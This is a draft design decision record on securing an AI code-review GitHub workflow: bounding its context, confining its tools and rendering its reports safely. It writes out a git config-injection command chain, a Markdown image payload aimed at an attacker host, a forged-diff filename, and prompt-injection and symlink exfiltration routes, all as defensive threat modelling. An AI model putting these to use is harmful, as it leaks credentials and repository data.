---
type: Decision
title: Bound Claude review context by selecting agent mode instead of tag-mode history assembly
description: Replace the mention workflow's unbounded tag-mode context assembly with an agent-mode prompt whose every interpolated source is independent of discussion length, and record the loss of on-Pull-Request delivery as an explicit trade.
status: draft
generated:
  by: anthropic/claude-opus-5
  at: "2026-09-27T11:00:00Z"
sources:
  - id: work-item
    resource: https://github.com/ktogias/gnostoa/issues/326
    title: Bound Claude review context so invocation does not fail on large Pull Requests
  - id: owning-objective
    resource: https://github.com/ktogias/gnostoa/issues/15
    title: Automate deterministic knowledge-workflow mechanics without weakening assurance
  - id: hardening-decision
    resource: ./0093-harden-claude-code-github-actions-workflows.md
    title: Harden the Claude Code GitHub Actions workflows
  - id: observed-failure
    resource: https://github.com/ktogias/gnostoa/pull/319#issuecomment-5854764807
    title: Measured tag-mode context exhaustion on PR 319
  - id: mode-detector
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/modes/detector.ts
    title: Pinned action mode detection
  - id: agent-mode
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/modes/agent/index.ts
    title: Pinned action agent mode prompt assembly
  - id: data-fetcher
    resource: https://github.com/anthropics/claude-code-action/blob/9171db3e57d6a3140a37ddc2ba92788584e0ead6/src/github/data/fetcher.ts
    title: Pinned action tag-mode GitHub data fetcher
x-project-knowledge:
  id: kit.decision.0094.bound-claude-review-context
  owners:
    - team:gnostoa-maintainers
  scope:
    - gnostoa
  relations:
    - kind: references
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
    - kind: supersedes
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
    - kind: governed-by
      target: /decisions/0018-adopt-evidence-gated-capability-evolution-for-gnostoa-self-governance.md
    - kind: governed-by
      target: /decisions/0062-require-proportionate-prior-art-and-reuse-review.md
    - kind: verified-by
      target: /decisions/0093-harden-claude-code-github-actions-workflows.md
---

# Bound Claude review context by selecting agent mode instead of tag-mode history assembly

## Context

Decision 0093 hardened the owner-installed Claude workflows. It did not bound the
context those workflows assemble, because at installation time the reviewed Pull
Requests were small.

In the pinned action, `src/github/data/fetcher.ts` retrieves issue comments,
reviews, review comments and the changed-file list for tag mode with **no cap on
comment or review count**. The assembled prompt therefore grows with the
discussion rather than with the change.

Measured on PR #319 — same workflow, same pinned action, same model:

| | 2026-09-26 20:43 | 2026-09-27 08:23 |
|---|---|---|
| `FINAL PROMPT` | 1,418 lines / 163,864 B | 5,858 lines / 446,488 B |
| `is_error` | false | true |
| `total_cost_usd` | $4.24 | $0 |
| `num_turns` | 6 | 1 |
| `duration_ms` | 119,273 | 647 |

Zero cost with an empty `modelUsage` means the model was never called: the
rejection happens before dispatch. Four consecutive invocations failed this way.
PR #319 carries 676 comments and 1,099,660 bytes of discussion, of which the
accountable owner authored 70%, so `exclude_comments_by_actor` over the reviewer
bots removes roughly 30% and cannot approach the size that worked.

## Prior-art and reuse disposition

Reuse Decision 0093 as the authority for pins, credential-free checkouts, token
scope, trigger gating and bounded execution, with
`tests/test_claude_actions_workflows.py` as its enforcement. Seven of its eight
rules are carried unchanged. **Rule 8's tool clause is partly superseded here**
-- see the supersession section below -- and no other rule is touched.

Two alternatives were measured or read before choosing:

- **`exclude_comments_by_actor` / `include_comments_by_actor`.** The only
  context-reducing inputs the pinned action offers. Rejected as insufficient on
  the measured distribution, and an allowlist that drops owner comments would
  remove exactly the dispositions a reviewer needs.
- **A rolling summarisation digest of the discussion.** Rejected as a second
  artifact that must be maintained and can drift. The repository has already
  observed that failure mode: a transcribed test count in an assessment was
  reported stale four times while the subject moved from 103 to 120.

No new dependency, service or runtime is introduced.

## Decision
1. The mention workflow supplies a `prompt` input. Per
   `src/modes/detector.ts`, supplying `prompt` selects **agent mode** even on
   comment events; per `src/modes/agent/index.ts` agent mode builds the prompt as
   the supplied text alone and fetches no GitHub data. Bounded context is
   therefore obtained by mode selection, not by summarisation.
2. Every interpolated source in that prompt must be independent of discussion
   length. The admitted set is the repository identity, the issue or Pull Request
   number, head and base SHAs, the issue or Pull Request body, the triggering
   comment body, the triggering review body, the issue title, the issue and Pull Request author associations, the reviewed head repository name, the
   Pull-Request-backed presence flag on an issue payload and the triggering review
   comment's path, line, diff hunk, original commit id and original line, and
   the resolved pull number the guard step reports. Item type is keyed on that
   number rather than on head/base equality, which a merged or empty Pull
   Request can satisfy while still being a Pull Request. Each is one bounded field; none
   scales with the number of comments. Any expression outside that set fails the
   contract test.
3. The static prompt is bounded at 4096 bytes. Total context is then the prompt
   plus one comment body plus one Pull Request description, none of which scales
   with the number of comments.

   **What that bound is, precisely.** It removes the dependence on discussion length,
   which is what failed: the reviewer no longer reads more as a Pull Request
   accumulates comments. It does **not** cap the interpolated bodies themselves. A
   GitHub Actions expression cannot truncate a value, so each body arrives at whatever
   length the provider allows for one body -- far larger than the prompt bound, though
   a small multiple of it rather than the unbounded accumulation this Decision exists
   to remove. Calling the total "bounded" without saying which bound was meant
   overstated it, and this rule now says which.
4. The prompt must forward the triggering request. Agent mode ignores the comment
   body unless the template interpolates it, so an unforwarded mention would
   review nothing while appearing to succeed.
5. Context is obtained by **retrieval rather than pre-loading**. The prompt names
   what to review and where to look; the reviewer uses its own tools to read the
   diff and the files it needs. Nothing is lossily pre-summarised.
6. The Pull Request description is the one curated state input. On Gnostoa-self
   candidates it is already an agent-maintained current-state projection, so it
   carries dispositions without carrying the transcript.
7. Because the reviewer no longer receives the discussion, the prompt instructs it
   to raise a possibly-settled point as a question rather than as an assertion.
8. The checkout must bind an explicitly **resolved** commit, and that commit is the
   **base** (see rule 21). Agent mode performs no Pull Request resolution, so a
   default checkout on a comment event lands wherever `github.ref` points -- the
   default branch, or on the review triggers the candidate's merge ref. The reviewed
   head is still resolved, in order, from a submitted review's `review.commit_id`
   when the event carries one (rule 18), else the event's own Pull Request head SHA,
   else the head reported by a token-side lookup of the resolved pull number, else
   the triggering ref; it identifies the **comparison** the context step asks for,
   not a tree to check out.
9. **The mention job must never check out a fork-controlled head.** Binding the
   checkout to a Pull Request head places contributor-controlled code in the job
   that holds the Claude credential. The author-association gate does not close
   this: it constrains who comments, not whose code runs. The head is therefore
   resolved with the read-only token in a step that fails closed when the head
   repository differs from this repository, before any candidate byte is checked
   out, reaching the same boundary Decision 0093 rule 5 sets for the automatic
   review.
10. The reviewer diffs against the **resolved base**, not a fixed branch, and the
   prompt names the repository's declared entry route -- `README.md` first, as
   `AGENTS.md` itself states.
11. The prompt must cover every admitted trigger payload. `issue_comment` carries
   `github.event.issue.*`, the review triggers carry `github.event.pull_request.*`,
   and `issues: opened` may hold the mention in the title alone. A template that
   reads only one shape silently loses the others.
12. **The reviewer gets no shell, and retrieval happens in a trusted step.** The
   pinned action disables Bash by default, so a retrieval-based prompt would
   otherwise leave the reviewer with a checkout it cannot inspect. Two successive
   attempts to grant a safe git were both wrong, and the second failure is the
   instructive one.

   A verb-prefix grant is not read-only:
   `git log --output=.git/config --format=%B -1 <sha>` writes an attacker-authored
   commit message into repository config and a following
   `git diff --ext-diff <base> <head>` executes the `diff.external` it configured.
   Replacing the prefix with a wrapper that validated its arguments then still
   read arbitrary host files, because `git diff <pathA> <pathB>` implies
   `--no-index` when a path lies outside the working tree. Both were reproduced.

   The second fix was patched rather than replaced, and that was the error. A
   `Bash(<program>:*)` grant is a grant of **a shell**: redirection, pipes and
   substitution remain available no matter what the invoked program validates, so
   an argument allowlist is the wrong kind of control for this hazard and each
   patch only moved the boundary. **No Bash of any shape is granted.** A trusted
   step performs the retrieval itself with fixed arguments and no
   candidate-controlled input, writing `diff.stat`, `commits.log` and a
   size-bounded `diff.patch` into `.gnostoa-review-context/`, which the reviewer
   opens with `Read` and `Grep`. The comparison is asked of the provider for the two
   resolved revisions rather than computed from a local candidate tree, which is what
   lets rule 21 hold. Two properties of that source are recorded because they were
   found by exercising it rather than by reading about it: a file's status is written
   as the full word, since `removed` and `renamed` share a first letter and a reviewer
   must be able to tell a deletion from a rename; and the provider's two collection
   limits differ, so they are handled differently. Commits are paginated at 250 per
   page, so every page is requested, and `commits.log` still states how many of how
   many when the reported total exceeds the listed count. The changed-file list is
   capped at 300 and is **not** paginable, so `diff.stat` carries an explicit notice
   once it reaches that cap rather than letting a capped summary read as the whole
   change. A missing per-file patch is a **neutral fact, not a file type**. It occurs for a
   binary or oversized blob, whose bytes are in neither the diff nor the checkout, and
   equally for a metadata-only change -- a mode bit, an empty file, a pure rename --
   which is perfectly reviewable from its status. Calling every such entry binary made
   the prompt require a real change to be reported as not examined, and dropped it from
   the assembled fallback entirely. The artefact is therefore `no-patch.txt`, and the fallback
   keeps a header for every changed file whether or not it carried hunks.

   `status` cannot distinguish the two further -- a mode-only change and a binary
   content change both arrive as `modified` with no hunks -- so `no-patch.txt` carries
   each entry's blob identity beside its status. It does **not** require the reviewer
   to say which case it is: on the assembled fallback there is no old mode and no old
   blob, so that judgement has nothing to rest on, and asking for it contradicted the
   same paragraph's own admission that status cannot distinguish them. The reviewer
   reports such an entry as not examined. The reviewer
   is told plainly that a file's pre-change state is **only what the diff shows**: this
   slice collects no base bytes, so nothing may present the checkout, which is the
   default branch (rule 21), as the pre-change revision. Supplying the exact pre-change
   revision of each changed file is a real gap and is deliberately deferred to a
   follow-on slice rather than approximated here; approximating it is how a reviewer
   comes to report interaction findings that are not real.

   One committed script, `.github/review-context/build_review_context.py`, derives
   `diff.stat`, `no-patch.txt` and the assembled fallback from a single comparison
   payload. That keeps the comparison to one request, keeps the step free of an
   external `jq`, and puts the field semantics somewhere the suite can exercise
   directly. There is no network access in that script and no subprocess at all: the
   step fetches the comparison and the script turns it into files, so no provider
   value reaches a process argument and no other origin is representable.

   A **renamed** entry keeps its old path in every retained artefact, because bytes and
   hunks presented under a new name with no record of where they came from leave the
   reviewer unable to reason about precisely the swap and overwrite cases a rename
   raises: `diff.stat` shows `old -> new` and the assembled fallback uses `--- a/<old>`
   against `+++ b/<new>`.

   **Every path is quoted before it enters one of these artefacts.** Git permits a
   newline in a pathname and the comparison carries it through as JSON, while every
   artefact here is read line by line -- so a name interpolated verbatim could add a
   `+++ b/other.py` header, a diff line, or an extra `diff.stat` record, and make
   unrelated text look like a change to a different file. The reviewer has no git and
   no candidate tree, so it has nothing to check that against. The quoting is the one
   `git -c core.quotePath=false` uses: control characters, a double quote and a
   backslash are C-quoted, and ordinary UTF-8 is left alone, because a legitimate
   international filename is not a line-injection risk and quoting it would only make
   the artefacts harder to read. Quoting rather than refusal, because such a
   name is a legal path and dropping the file would hide a real change. The contract
   test builds the artefacts from a comparison whose filename carries
   `\n+++ b/innocent.py` and asserts no forged line reaches the start of a line in any
   artefact.

   Git's rule alone is **not sufficient**, and this is the one place this Decision
   deliberately goes beyond it. `git -c core.quotePath=false` prints U+0085, U+2028 and
   U+2029 raw -- verified against Git itself -- because Git orients on bytes. These
   artefacts are read by a Unicode-aware reader, and Python's `str.splitlines`, which
   the reviewer's tools use, treats all three as line breaks, so a name carrying one
   recreated exactly the forged-record problem the C0 quoting closed. They are escaped
   too, as the octal of their UTF-8 bytes, which is how `git -c core.quotePath=true`
   renders a non-ASCII byte: the escape stays in Git's own vocabulary even where Git
   itself does not apply it.

   **A commit subject is candidate-controlled text too**, and `commits.log` is read
   line by line like every other artefact here. Splitting a message on `\n` in the step
   left a Unicode line separator intact, so a subject could add a standalone fake commit
   -- or a fake `[provider listed ...]` notice -- to a file the reviewer trusts.
   Subjects are therefore carried base64-encoded out of the provider request and
   rendered by the same committed script, through the same escaping as a pathname. The
   cap notice is appended after that rendering, so the count it states is a count of
   records the reviewer will actually read. One undecodable subject is that commit's
   gap, recorded as `[subject unavailable]`, not the step's failure.

   The prompt asks for **no verdict these artefacts cannot support**. A real unified
   diff separates a binary content change from a mode-only one, by its mode lines and
   its binary notice; the assembled fallback carries neither, so when `patches-source`
   is present the honest answer is "not examined" rather than a guess. Demanding
   "report which" unconditionally was the same false-claim defect this rule records
   elsewhere, in the one place the reviewer would have had to invent an answer.

   The provider requests are **retried a bounded number of times**. They ran unguarded
   under `set -eu`, so one transient 5xx ended the step, the reviewer never started, and
   the Pull Request got no review -- this Decision's own failure mode, reached by a
   transient error rather than by size. Each attempt writes to its own file and is moved
   into place only on success, so a partial body is never left behind nor appended to by
   the next attempt. A persistent failure still stops: there is nothing to review
   without the comparison, and a silent partial context would be worse than a visible
   red check.

   **Non-LF line separators inside a diff record are escaped.** A changed line may
   legally contain a lone CR or U+0085/U+2028/U+2029, while this splitter and Git orient
   on LF, so a record carrying `+++ b/forged.py` after one of them appeared to a
   Unicode-aware reader as a standalone file header -- the forgery closed for pathnames
   and commit subjects, reappearing in the diff body itself. They are escaped to their
   octal UTF-8 bytes, as pathnames are, and `patches/README` says how many and why. A CR
   directly before an LF is a Windows line ending rather than a separator of its own and
   is left alone. This is the one substitution the parts carry: they are otherwise
   byte-for-byte, and the README distinguishes the two.

   The parts are also **hard-wrapped** at a reader-visible line length. Fixing the
   UTF-8 split was not sufficient: the reviewer's `Read` truncates a physical line
   beyond roughly two thousand characters and indexes by line, so a minified or
   generated record would leave its tail unreachable while the prompt claimed
   `patches/` holds the whole diff. No byte is removed or reordered, and each continuation line is
   marked with a character that never begins a line of unified diff output: without it
   a segment starting with `-` or `+` would read as a deletion or an addition, and one
   starting with `+++ b/` as a different file, so the reviewer could attribute content
   to the wrong side of the change. The wrapping, its count and the marker's purpose are
   disclosed in `patches/README`, together with the consequence for line numbering: a
   wrapped record occupies several displayed lines, so counting lines within its hunk
   no longer matches the file's own numbering, and a finding there cites the hunk
   header with the line number called approximate.

   The bound notice follows the **number of parts produced**, not the size of the
   input, and the chunker writes `diff.patch` itself for that reason. A diff that fits
   the bound until wrapping pushes it past would otherwise be split into parts while
   `diff.patch` claimed to be the whole thing -- the reviewer would finish without ever
   learning a tail existed.

   The notices come **out of the same bound**, not on top of it. Taking a whole part
   as the overview and appending afterwards let `diff.patch` exceed the very number it
   prints -- an artefact asserting something false about itself, which is the defect
   class this rule keeps closing. The overview is therefore a line-boundary prefix
   sized with its notices rather than part one verbatim; it is still whole lines, so it
   still decodes as text, and if reserving that room is what makes it short, it says it
   is bounded and points at `patches/` like any other truncation.

   **Wrapping is disclosed on its own**, whenever a record was wrapped, and not only
   when the size bound was also crossed. A diff holding one very long record can fit in
   a single part, and then `diff.patch` carried inserted newlines and continuation
   markers with nothing saying they are synthetic: the reviewer would read them as real
   diff content and compute line numbers from them. Tying the disclosure to the bound
   notice also hid the pointer to `patches/README`, where the consequence for line
   numbering is explained -- so the one case that most needs the rule was the one case
   that never received it.

   A refused diff does not fail the step, and does not leave the reviewer without the
   change either. The provider can decline the diff of a very
   large comparison, and exiting there would reproduce the large-Pull-Request failure
   this Decision exists to remove, The per-file patches assembled from the same comparison payload take
   the unified diff's place, so the changed content is still reachable; `patches-source`
   says so, and that context outside each hunk is absent. Writing only a notice would
   have let a review complete without ever seeing the change.

   The parts are cut by a second committed script,
   `.github/review-context/chunk_diff.py`,
   rather than by coreutils. Line boundaries are still preferred, but a single line
   longer than the bound must be cut somewhere, and the record mode of `split` cuts it
   by bytes -- halving a multibyte character and leaving two parts a text reader
   cannot decode. The script retreats off any UTF-8 continuation byte instead. A bound
   that cannot hold a single character is **refused rather than papered over**: that
   retreat previously fell back to the raw limit on reaching the start of the buffer,
   splitting the very character it exists to keep whole, silently. That is a
   configuration error and now says so. A non-positive bound is different and stays
   legal -- it is what the overview asks for when its notices already fill the limit,
   and the answer there is "no room", not an error. Being
   committed, it comes from the default branch exactly as this workflow does, and the
   suite exercises it directly rather than by extracting it from YAML. The bound on `diff.patch` is deliberate: an
   unbounded diff would reintroduce the context exhaustion this Decision exists to
   remove. Bounded must not mean unreachable, though. With no git, a reviewer
   cannot recover a deletion that falls past the cutoff and the checkout no longer
   holds the removed content, so the whole diff is also written as fixed-size parts
   under `patches/`, read in name order. Those parts are split on line boundaries
   under the byte bound rather than at exact byte counts, because the reviewer reads
   them as text and a byte cut can leave a multibyte character split across two
   files; the overview is cut on the same line boundaries for the same reason. The reviewer therefore pages the diff by
   its own choice, which is what bounded context is supposed to mean. Item type is
   keyed on the resolved pull number here too, never on head/base equality, and an
   emptied Pull Request still receives every artefact the prompt names. The
   contract test executes the step, checks each artefact, the bound, the emptied
   and no-Pull-Request paths, asserts the concatenated parts equal the full
   `git diff`, and asserts the step interpolates no event data.

13. Requests with **no Pull Request** are answered from the repository rather than
   from a diff. `issues: opened` stays an admitted trigger under Decision 0093
   rule 7, and there the resolved base equals the head, so a diff-shaped
   instruction would compare nothing. The prompt shows both SHAs so the
   distinction is observable rather than implied.
14. Inline review location is forwarded. On `pull_request_review_comment` the
   meaning of a request often lives in the comment's path, line and hunk rather
   than its body, and agent mode fetches none of it.
15. **Externally authored issue text is withheld.** The job gate validates the
   replying author's association, not the issue author's. Since this job holds the
   Claude credential, grants `Read`, and publishes its answer in a public step
   summary, an external issue body would otherwise be an injection path into a
   credentialed agent with public output. The issue body and title are interpolated
   only when the issue author is `OWNER`, `MEMBER` or `COLLABORATOR`, and the prompt
   says so where the text would have been. The Pull Request body needs no separate
   gate: rule 9 already refuses a fork-controlled head, so a reviewed Pull Request
   is authored inside this repository -- but its *description* need not be. The gate
   therefore keys on the author's association for **both** payload shapes -- the
   issue body and title on `issue_comment`, and the Pull Request body on the review
   triggers -- with no exemption for a Pull-Request-backed issue payload. Gating one
   shape and leaving the other open closes nothing.

   Two reviewers took opposite positions here and both were right. Exempting Pull
   Requests preserves the curated state for one opened by a bot or any account
   without a trusted association; not exempting them keeps untrusted description
   text out of a credential-bearing job that publishes publicly. Safety is chosen:
   **a Pull Request whose description is authored by an untrusted association loses
   its curated-state input**, and the prompt says so where the text would have been.
   The diff, the files and the request itself remain fully available, so the review
   is narrower rather than impossible.

16. **The tool grant and the requested permissions must agree.** `actions: read`
   installs nothing on its own; agent mode installs the CI server only when
   `--allowedTools` names an `mcp__github_ci` tool. The three read-only CI tools are
   granted so the permission is used, rather than left as dead configuration that a
   reader would mistake for capability.

17. The inline comment's **original** identity is forwarded alongside its current
   one. An inline thread carried forward after a push identifies the new head while
   its diff hunk can originate from an older commit, so without
   `original_commit_id` and `original_line` the reviewer cannot detect that it is
   interpreting the request against different code.
18. **The checkout follows a submitted review's commit, but not an inline
   comment's.** A push landing while an older *submitted review* is open leaves
   `pull_request.head.sha` ahead of the commit that review describes, so checking
   out the head reviews different code from the one the forwarded body refers to.
   `ci/review_github_current_state.py` already treats `review.commit_id` as a
   review's `head_commit`, and the guard step follows the same identity -- gated on
   `github.event_name == 'pull_request_review'`, not on the field's presence, since
   a `pull_request_review_comment` payload can carry a review object too and
   selecting it there would reintroduce exactly the dropped-commits defect below.
   `comment.commit_id` is deliberately **not** used the same way: an inline comment
   can hang off an earlier commit of a multi-commit Pull Request, so treating it as
   the head would silently drop the later commits while the report still reads as a
   review of the whole Pull Request. The comment's own commit identity is forwarded
   in the prompt for interpreting its hunk instead, which is what rule 17 is for.
19. **Every interpolated context is classified, and unknown ones fail closed.** A
   contract test that recognises only the contexts already in use is not a
   contract: an added `secrets.*`, `env.*`, `vars.*` or `needs.*` interpolation
   would contribute no identifier and leave the exhaustive-source test green, in a
   job that publishes its output publicly. The test therefore strips string
   literals, classifies every remaining token as a known function, a keyword or a
   context, and fails on anything it cannot place. Positive controls assert that
   each of those contexts is reported as unadmitted, so the test cannot pass
   through a blind spot in its own parser.

20. **The symlink hazard is removed rather than guarded.** `Read` follows a symlink
   to its target before a report reaches a public step summary, and the prompt sends
   the reviewer to `README.md` and `AGENTS.md`, so a candidate that replaced either
   with a symlink to a runner path would turn the entry route into an exfiltration
   primitive. Rule 9 does not cover it: the fork guard constrains whose repository
   the head comes from, not what a branch inside this repository contains. An earlier
   revision of this Decision answered it with a guard step that refused a candidate
   containing symlinks, mirroring `tools/candidate_prepare.py`. Rule 21 supersedes
   that: no candidate tree is materialised at all, so there is no candidate symlink,
   mode or file to guard, and the entry route is the base commit's. A guard is
   retained in `tools/candidate_prepare.py` for preparation, where a tree genuinely
   must exist; this job needs none.
21. **No candidate tree is materialised in the credential-bearing job.**
   `docs/security.md` of the pinned action warns against checking out an untrusted
   ref before it, and CodeQL flags the shape itself -- a privileged workflow that
   materialises a contributor-controlled tree -- however that tree is placed. Three
   findings in this surface, and two failed attempts to grant a constrained git, were
   all downstream of accepting the shape and hardening inside it. The shape is
   therefore gone.

   Only the **protected default branch** is checked out, named by a repository
   property rather than by anything a trigger carries. Three alternatives were each
   wrong. A bare checkout follows `github.ref`, which on `pull_request_review` and
   `pull_request_review_comment` -- two of the four admitted triggers -- is
   `refs/pull/N/merge`, the candidate merged into its base, and it fails outright when
   a Pull Request conflicts with its base and has no merge ref. The resolved base SHA
   is a step output, which CodeQL treats as untrusted provenance in a privileged
   workflow, and it is in any case the base a contributor chose rather than the branch
   this repository protects. The head is the candidate itself. The default branch
   supplies the entry route the prompt names. It is **not** a pre-change state, and
   this Decision must not call it one: the prompt tells the reviewer never to use that
   checkout for this change's state, and the rules below say the same, so describing it
   as readable pre-change state here would license exactly the reading the prompt
   forbids. The comparison is still asked for against the *resolved* base, so the diff
   is exact; the change itself arrives only as the artefacts of rule 12, built from the
   provider's comparison for the two resolved revisions. No candidate file, mode or
   symlink is ever written to the runner, and the reviewer is given no
   `--add-dir`.

   What this costs is real and is accepted: the reviewer sees this change only through
   the artefacts, so both sides of every changed file come from the diff alone. The gain is that an entire hazard class -- candidate-authored entry routes,
   symlinked reads, mode tricks, and execution of candidate content -- cannot arise
   rather than being guarded against. Read confinement remains defence-in-depth
   only: a `settings` deny list covers the obvious runner paths **for every granted
   filesystem tool**, since a `Read` rule does not constrain `Grep`, whose
   ripgrep-backed search would return matching lines from the same path. The runner's
   own working areas are included, because the raw event payload under `_temp` still
   contains the issue and Pull Request bodies that rule 15 deliberately withholds --
   denying only `.ssh` beneath `/home` left the trust gate reachable around. This
   repository still cannot verify the reviewer's enforcement of those rules, so the
   structural control is the absence of candidate content rather than the deny list.

   The checkout is pinned to `github.workflow_sha`, the revision GitHub bound the run
   to, rather than to a branch name resolved when the job executes: a queued run whose
   default branch has since advanced would otherwise execute newer collection scripts
   than the workflow and Decision it started under, silently moving this boundary.

   The prompt states what the checkout actually is: the default branch, which may have
   advanced past the Pull Request's base or belong to a different branch, and it
   reserves that tree for the entry route and general context, **never for this
   change's state**. Declaring the tree non-authoritative while still instructing the
   reviewer to read it for pre-change state was the same defect in a second place, and
   saying "the Pull Request's base" was false in both cases: it would have had the
   reviewer read unrelated upstream state as the pre-change state. What the change did
   lives only in the artefacts of rule 12, and the prompt says so -- including that a
   file's state before the change is only what the diff shows. This also answers the
   residual on trusting the entry route: the route is a **known protected revision**
   rather than a base a contributor chose, and the resolved base is used only for the
   comparison. The tree being non-authoritative is therefore stated to the reviewer
   rather than only recorded here -- which is what an earlier revision of this Decision
   got wrong by calling it a "stated caveat" while never stating it.
22. **The report is published by this repository, with render-time fetches removed.**
   The action's `display_report` input documents itself as outputting
   "Claude-authored content in the GitHub Step Summary" and says it "should only be
   used in cases where the action is used solely with trusted input". This job's input
   is a candidate Pull Request, which is untrusted by definition, so that setting is
   `false`.

   The hazard is specific and is the one channel every other rule here misses. Rules
   9, 12, 15, 20 and 21 all govern what the reviewer **reads**. This one governs what
   it **publishes**. A step summary renders Markdown, including images, so a report
   that echoes attacker-supplied text can carry `![](https://attacker/?q=...)` which
   is fetched when the page is rendered, with no click, carrying whatever the reviewer
   placed in that URL out of a credential-bearing job. GitHub proxies such images
   through camo, so the request comes from GitHub's infrastructure rather than a
   viewer's browser -- that changes who is seen making it, not whether the attacker
   receives the data. The action's own tests confirm its formatter
   preserves Markdown images.

   A committed script therefore reads the execution file the action exposes, extracts
   the reviewer's final text, and appends it to the summary as **literal text inside
   one fenced block that the script owns**. Nothing inside a code fence is interpreted
   as Markdown or HTML, so no image, `<img>`, link or scheme in the report can cause a
   fetch. The report is bounded and truncated with a notice -- before the block is
   built, so a cut can never land inside the closing fence and leave the rest of the
   summary unterminated. The reviewer's final text is taken from the last result turn
   that actually carries text: an empty result turn was being returned as the report,
   which shadowed real assistant output and published "the reviewer produced no final
   text" over a review that existed. The step runs on `always()` **and nothing else**:
   gating it on the action having produced an execution file meant that a reviewer which
   failed before writing one -- a bad input, a credential problem, a crash at startup --
   produced no summary at all, which is exactly the silent failure `always()` was
   claimed to prevent. The script reports an unreadable or absent file rather than the
   step hiding it.

   **Only a refusal reaches the lossy fallback.** After the retry, every persistent
   failure still entered it, so an authentication error, a permission error or an
   outage was published as "the provider refused the diff" -- an incomplete review
   presented as a complete one, which is the claim class this Decision exists to close.
   The provider answers 406 when a comparison's diff is too large to generate, and that
   is the one status the fallback accepts. It fails closed: an unrecognised failure is
   an error, not a refusal.

   **The artefact says what the prompt says.** Correcting the prompt to stop asking
   which case a no-hunk entry is left `no-patch.txt` still telling the reviewer that
   the status distinguishes them. An artefact contradicting the instruction is worse
   than either being wrong alone, because the reviewer has no third source with which
   to break the tie. The header now carries the same rule, in the same words.

   **The execution file is bounded before it is parsed.** The report is capped at 64
   KiB, but the whole file was materialised first, so an oversized one consumed runner
   memory before any cap applied. A bound that arrives after the cost is not a bound.

   **Every provider request in the job is retried**, not only the comparison. The Pull
   Request lookup on an `issue_comment` event and the unified-diff request were both
   unguarded under `set -eu`; the second is worse than a failure, because treating a
   transient 5xx as a refusal silently downgrades the review to hunks with no
   surrounding context. The lookup is also made **once** and both fields read from that
   one retained response: asking twice let the head change between the fork check and
   the SHA read.

   **`--paginate` does not page this endpoint by itself.** The compare API returns its
   default 250 commits unless `per_page` is given, so a larger comparison silently lost
   every later subject while the cap notice said only that some were missing -- a notice
   that was true about the count and misleading about the cause.

   **The fence is chosen longer than the longest run of backticks anywhere in the
   report**, so no line in it can close the block, whatever containers the text puts
   around it. That is the whole safety argument: one invariant, checkable in a line,
   with no model of Markdown's block structure behind it.

   The shape it replaced scanned for fences and escaped only the lines it believed were
   outside them, and it was **wrong twice**. First, normalising every fence to three
   characters let a four-backtick opening be "closed" by three and reopened by four.
   Following CommonMark exactly fixed that one -- and the second is the instructive one,
   because it was not a coding mistake at all. CommonMark scopes a fence to its
   container: `- a`, then two spaces and a fence, opens a fence **inside the list item**,
   and the next unindented line cannot continue the item lazily, so the item and its
   fence both close and what follows renders. The scanner, which tracked fences without
   tracking containers, still believed it was inside and published an image raw. It was
   reimplementing CommonMark block structure, and each fix made it a slightly better
   implementation of the wrong thing. Removing the need to know where Markdown is
   removes the class, which is the same move rules 20 and 21 make.

   The cost is real and is accepted: the report renders as monospace text, so its
   headings are not headings and its `file:line` references are not links. A report
   whose content is exact and unrendered is worth more here than a rendered one whose
   safety rests on matching another parser's block structure.

   The contract test asserts the block's boundaries, that the report survives **byte for
   byte** inside it, and that no line of the report can close the fence -- over the
   vectors above, both regressions included. The closing rule it checks against is
   re-implemented in the test and so shares any misreading of CommonMark with the
   subject: it catches a coding mistake, which is what a suite can do offline, not a
   wrong reading of the specification.

   The real oracle is GitHub's own renderer, and it was used. Against the head that
   introduced this shape, thirteen vectors were rendered through `gh api /markdown`
   with `mode=gfm`: inline and reference images, raw `<img>`, `<iframe>`, `javascript:`
   and `data:` links, an HTML comment, closing `</code></pre>` tags, a fence inside a
   list item, a fence inside a blockquote, the four-then-three-then-four escalation, a
   tab-indented fence, a backtick in the info string, a tilde fence, and a report that
   closes its own fence. **None rendered an `<img>`, a camo URL or an anchor.** The
   same list-item vector rendered a camo `<img>` through the previous shape, which is
   how the second defect was confirmed rather than argued. That check needs the network
   and so cannot run in the suite, which is why it is recorded here.

23. **Every review-context script confines its paths, through one check.** The
   committed scripts
   take their directories and files from the workflow, which is trusted -- but a value
   that reaches a file read or write is checked where it is **used**, not where it was
   set. Each resolves its argument and refuses anything outside the runner area it
   belongs to: the workspace for the collectors, the runner temporary directory for the
   publisher's execution file, with an absolute path and an existing parent as the floor
   when no root applies. Degenerate arguments are refused before any of that: an empty
   string resolves to the working directory, which is a real path that would otherwise
   satisfy every check, and a directory where a file is expected is refused here rather
   than failing later with a confusing error or naming something writable. The step summary's own path is deliberately **not** pinned to a
   root: it lives under the runner temporary directory today, but that is an
   implementation detail, and refusing to publish because the runner moved a file would
   lose the review over an assumption about its layout. A later edit of the workflow therefore cannot point
   a collector at `/etc` or the publisher at an arbitrary file, and a static analyser
   reading these scripts in isolation sees the validation rather than an unchecked path.

   There is exactly **one implementation**, in
   `.github/review-context/review_context_paths.py`, which the scripts import. It began
   as a copy in each, and that check has since been wrong twice -- it accepted a leading
   dash, and it accepted an empty argument -- with each fix having to be made in three
   places. A second copy is a second chance to fix one and miss another. Each script is
   run as `python3 .github/review-context/<name>.py`, so the directory holding all of
   them is what Python puts first on its own search path: the import needs no path
   manipulation and never consults the caller's `PATH`. The module is owned by the same
   guardrail as the scripts that import it.

24. **The session is bounded in turns.** `--max-turns` caps how long the reviewer may
   iterate. The prompt bound of rule 3 limits what the session starts with; this limits
   what it can accumulate while running.

## Accepted trade: delivery is no longer on the Pull Request

Agent mode sets `claudeCommentId: undefined` and provides **no GitHub
comment-posting tool**. A review therefore cannot post itself to the Pull
Request through the action.

Posting would require write scope on `GITHUB_TOKEN`, which Decision 0093 rule 4
forbids. That rule is not amended here. Results are delivered to the workflow run's
step summary -- but written by this repository rather than by the action, for the
reason rule 22 records.

The consequence is explicit: **bounded context is bought at the cost of inline
Pull Request delivery.** The review is durable and linkable from the run, but it
is not in the Pull Request record and peer reviewers do not see it. Restoring
on-Pull-Request delivery without widening `GITHUB_TOKEN` is a separate question
and is not admitted by this Decision.

## Alternatives considered and not taken

